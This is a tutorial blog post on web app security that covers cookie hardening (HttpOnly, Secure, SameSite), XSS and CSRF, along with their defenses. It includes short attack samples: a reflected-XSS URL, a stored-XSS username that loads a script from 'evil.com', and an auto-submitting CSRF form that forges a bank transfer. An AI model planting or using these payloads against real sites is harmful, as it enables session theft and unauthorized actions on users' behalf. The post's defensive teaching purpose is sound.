@@ -1,0 +1,167 @@
+---
+title: Securing Your Web App — Cookies, XSS, and CSRF
+description: This post covers the three security topics that every web developer should understand cookies and how to harden them, XSS, and CSRF and how to protect from these attacks.
+image: /images/blog/security.png
+createdAt: 2026-04-19
+updatedAt: 2026-04-19
+---
+## Cookies: Small Files With Outsized Security Implications
+
+A cookie is the browser's way of remembering state between requests. Your server sets one, the browser stores it, and from then on the browser sends it back with every matching request. That automatic behavior is what makes cookies useful for sessions — and what makes them a target.
+
+A basic session cookie looks like this in the `Set-Cookie` header:
+
+```bash
+Set-Cookie: sessionId=abc123; HttpOnly; Secure; SameSite=Strict; Path=/; Max-Age=3600
+```
+
+Each attribute here matters.
+
+**HttpOnly** tells the browser that this cookie cannot be accessed by JavaScript. No `document.cookie`, no stealing it via XSS. This is the single most impactful thing you can do for a session cookie. If an attacker injects a script into your page, HttpOnly ensures your session token isn't automatically up for grabs.
+
+**Secure** means the cookie will only be sent over HTTPS. Without this, on an HTTP connection, the cookie goes out in plaintext — readable by anyone watching the network. In production, this should never be absent on an auth cookie.
+
+**SameSite** controls when cookies are sent on cross-origin requests. This is the one people get confused about, so let's slow down here.
+
+- `SameSite=Strict` means the cookie is only sent when the request originates from the same site. If a user clicks a link on a third-party site that goes to your app, even navigating to your app, the cookie won't be sent on that first request. This is very safe but can break flows like "return to site" redirects from payment processors.
+
+- `SameSite=Lax` is the sensible middle ground. The cookie is sent for top-level GET navigations from other sites (like that payment redirect), but not for cross-origin POST requests, iframes, or image loads. Modern browsers use `Lax` as the default now, which is a meaningful improvement to the web's baseline security.
+
+- `SameSite=None` opts out of all restrictions but *requires* `Secure`. You'd use this for third-party embeds or OAuth flows where cookies need to travel cross-origin deliberately.
+
+For a session cookie protecting a regular web app, `SameSite=Lax` with `HttpOnly` and `Secure` covers the majority of threats. If your app has no legitimate use for cross-origin cookie sending, `Strict` is better. The trade-off is just some UX friction with external redirects.
+
+---
+
+## XSS: When Your Page Executes Code It Shouldn't
+
+Cross-Site Scripting (XSS) is when an attacker gets malicious JavaScript to run inside your app in someone else's browser. The name is a bit misleading — the "cross-site" part describes the attack origin, not where the script runs. The script runs *on your site*, in your user's browser, with full access to your DOM and any cookies that aren't HttpOnly.
+
+### Reflected XSS
+
+The classic example. A page takes a URL parameter and renders it in the HTML:
+
+```bash
+https://example.com/search?q=<script>alert('xss')</script>
+```
+
+If the server drops the raw query parameter into the HTML without escaping it, the browser sees a `<script>` tag and executes it. Attackers exploit this by sending the crafted URL to victims — in a phishing email, for example. The victim clicks it, the script runs in their browser on your domain, and it can do whatever it wants: steal cookies, make authenticated API requests, modify the DOM.
+
+### Stored XSS
+
+This one is more dangerous because the attacker doesn't need to trick individual users. They find an input — a comment field, a profile name, a product review — that gets stored in the database and later rendered to other users. The malicious payload lives in your database. Every user who visits the affected page runs the script.
+
+Imagine a forum where usernames aren't sanitized. An attacker registers with the username `<script src="https://evil.com/steal.js"></script>`. Now every page that renders that username loads an external script from the attacker's server.
+
+### Defending Against XSS
+
+The primary defense is output encoding. Whatever data you're rendering in HTML, encode the characters that have special HTML meaning: `<` becomes `&lt;`, `>` becomes `&gt;`, `"` becomes `&quot;`, and so on. Modern frontend frameworks like React do this by default when you use JSX — `{user.name}` is always encoded. The risk comes when you intentionally render raw HTML via `dangerouslySetInnerHTML` in React or equivalent in other frameworks.
+
+The secondary defense is a Content Security Policy (CSP) header. CSP lets you tell the browser which scripts are allowed to execute. A strict policy like `Content-Security-Policy: script-src 'self'` blocks all scripts that don't come from your own origin — including any injected `<script>` tags or inline event handlers. Setting up CSP properly takes some work, especially if you use analytics or third-party scripts, but it's a strong backstop against the cases where output encoding fails or gets missed.
+
+HttpOnly cookies, as mentioned, mean that even if XSS does execute, it can't steal the session cookie. The attack can still do a lot of damage — make requests, exfiltrate data, modify the UI — but it can't directly hand the attacker a session token to use elsewhere.
+
+---
+
+## CSRF: Tricking a Browser Into Making Unauthorized Requests
+
+CSRF (Cross-Site Request Forgery) is a fundamentally different attack. The attacker doesn't need to inject code into your app. They take advantage of the fact that browsers automatically attach cookies to any matching request, regardless of where that request originated.
+
+Here's the scenario. You're logged into your bank. Your session cookie is sitting in your browser. You open a new tab and visit a malicious site. That site contains a hidden form:
+
+```html
+<form action="https://yourbank.com/transfer" method="POST">
+  <input type="hidden" name="amount" value="5000" />
+  <input type="hidden" name="to" value="attacker_account" />
+</form>
+<script>document.forms[0].submit();</script>
+```
+
+Your browser submits this form to `yourbank.com`. It automatically attaches your session cookie — because that's what cookies do. The bank's server receives an authenticated POST request to transfer $5,000. From the server's perspective, it looks completely legitimate.
+
+The attacker never saw your session cookie. They never needed to. They just needed a browser with an active session to send a request.
+
+### Defense 1: Anti-CSRF Tokens
+
+The classic defense is the synchronizer token pattern. The server generates a unique, unpredictable token for each session and embeds it as a hidden field in every form. When the form is submitted, the server checks that the token matches what it issued. An attacker on a third-party site can't read this token because of the Same-Origin Policy — they can't access your page's DOM. So even if they can forge the request, they can't include the correct token.
+
+In Express, the `csurf` middleware handles this (though it's deprecated — the current recommendation is to implement token validation manually or use a framework with built-in support):
+
+```javascript
+// Server: set the token in the form
+<input type="hidden" name="_csrf" value="<%= csrfToken %>" />
+
+// Server: validate on every state-changing request
+// If the token in the request body doesn't match the session's token, reject with 403
+```
+
+For SPAs making JSON API calls, a common approach is to store the CSRF token in a cookie (readable by JavaScript, so not HttpOnly) and have the frontend read it and send it as a custom header like `X-CSRF-Token`. The server validates the header. An attacker site can't read your cookies due to Same-Origin Policy, so they can't get the token.
+
+### Defense 2: SameSite Cookies
+
+This is where everything ties together. `SameSite=Lax` or `SameSite=Strict` on your session cookie breaks CSRF almost entirely. The bank form attack above fails because when the malicious form submits to `yourbank.com`, it's a cross-origin POST — and `SameSite=Lax` won't send the cookie on cross-origin POST requests. The request arrives at the bank's server without any session cookie, so it's unauthenticated and rejected.
+
+`SameSite` is now considered a primary CSRF defense, not just a hardening measure. With broad browser support and `Lax` being the default in modern browsers, many apps get meaningful CSRF protection without explicitly configuring it. But you shouldn't rely on it alone — browser defaults can lag, older browsers exist, and defense in depth is the point.
+
+### Defense 3: Check the Origin Header
+
+State-changing requests from browsers always include an `Origin` or `Referer` header. Your server can check these:
+
+```javascript
+app.use((req, res, next) => {
+  if (['POST', 'PUT', 'DELETE', 'PATCH'].includes(req.method)) {
+    const origin = req.headers.origin;
+    // Allow only your own origin
+    if (origin && origin !== 'https://yourapp.com') {
+      return res.status(403).json({ error: 'Forbidden' });
+    }
+  }
+  next();
+});
+```
+
+This is a supporting defense, not a primary one. Headers can be absent in some edge cases, and server-side request forgery bypasses it entirely. But combined with tokens and SameSite, it makes the defense much harder to get around.
+
+---
+
+## The Defense-in-Depth Picture
+
+Here's how these defenses stack:
+
+**Against XSS:** Output encoding (primary), CSP (secondary), HttpOnly cookies (limits damage even if XSS succeeds).
+
+**Against CSRF:** Anti-CSRF tokens (primary for traditional apps), SameSite cookies (primary for modern apps), Origin header checking (secondary).
+
+**Against session hijacking via XSS trying to send CSRF'd requests:** HttpOnly ensures the script can't steal the session cookie. SameSite limits what the script can do cross-origin. CSRF tokens mean requests from injected scripts on third-party sites can't forge valid requests.
+
+This is what "defense in depth" actually means in practice. No single control is foolproof. Combining them means an attacker has to defeat multiple independent controls simultaneously — and that gets hard fast.
+
+---
+
+## How CORS Fits Into the Security Model
+
+We talked about CORS in the previous post as a way to configure cross-origin API access. From a security angle, CORS is relevant here too.
+
+Your CORS configuration is part of your security posture. Setting `Access-Control-Allow-Origin: *` on an API that handles authenticated requests is a mistake. Wildcard CORS says "any website's JavaScript can make requests here and read the responses." That's probably not what you want.
+
+For APIs using cookie-based auth: use an explicit allow-list of origins, set `credentials: true`, and let SameSite do the heavy lifting on cookie-sending restrictions.
+
+For APIs using token-based auth (Authorization header): CORS matters less for the token itself — an attacker still needs to somehow obtain the token. But you still shouldn't wildcard it unless your API is genuinely public.
+
+The combination of `SameSite=Lax` on cookies and a strict CORS allow-list means a malicious third-party site can't make authenticated requests to your API *and* can't read responses from your API. That's a solid baseline.
+
+---
+
+## A Practical Checklist for Every Auth Cookie
+
+Before shipping a login system, run through this. Session cookie has `HttpOnly` (blocks JS access), `Secure` (HTTPS only), `SameSite=Lax` or `Strict` (kills most CSRF), and a reasonable `Max-Age` or `Expires`. All forms and state-changing API endpoints have CSRF token validation, at least for older browsers. All user input is encoded before being rendered in HTML. CSP headers are set and tested. CORS configuration uses an explicit origin list, not a wildcard.
+
+None of these individually guarantees security. All of them together make the attacker's job genuinely difficult.
+
+---
+
+---
+
+These three posts followed a path: HTTP as a protocol, HTTP as an API contract, HTTP as an attack surface. The same underlying machinery — requests, headers, cookies, origins — shows up differently depending on which angle you're looking from.
+
+The reason I find this layered view useful is that debugging gets easier. Mysterious 403s are usually a CORS or CSRF issue. Duplicate records in the database are often an idempotency problem. Compromised accounts trace back to a missing cookie attribute or an unescaped string. The patterns repeat across codebases, languages, and frameworks. Once you understand what's actually happening at the HTTP level, you spend less time searching for framework-specific answers and more time reasoning from first principles.
